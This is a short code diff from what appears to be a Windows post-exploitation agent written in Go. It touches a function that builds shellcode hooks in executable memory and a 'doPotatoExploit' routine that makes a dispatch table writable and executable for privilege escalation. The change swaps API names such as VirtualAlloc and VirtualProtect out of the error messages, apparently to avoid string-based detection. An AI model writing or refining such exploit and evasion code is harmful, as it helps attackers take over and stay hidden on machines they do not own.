@@ -289,7 +289,7 @@ func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err 
 	page, allocErr := windows.VirtualAlloc(0, 4096,
 		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
 	if allocErr != nil {
-		return 0, fmt.Errorf("VirtualAlloc for hook shellcode: %v", allocErr)
+		return 0, fmt.Errorf("allocate hook shellcode memory: %v", allocErr)
 	}
 
 	// Patch the flag address now that we know the page address
@@ -585,7 +585,7 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	err = windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
 	if err != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("VirtualProtect on dispatch table: %v", err),
+			Output:    fmt.Sprintf("protection change on dispatch table: %v", err),
 			Status:    "error",
 			Completed: true,
 		}
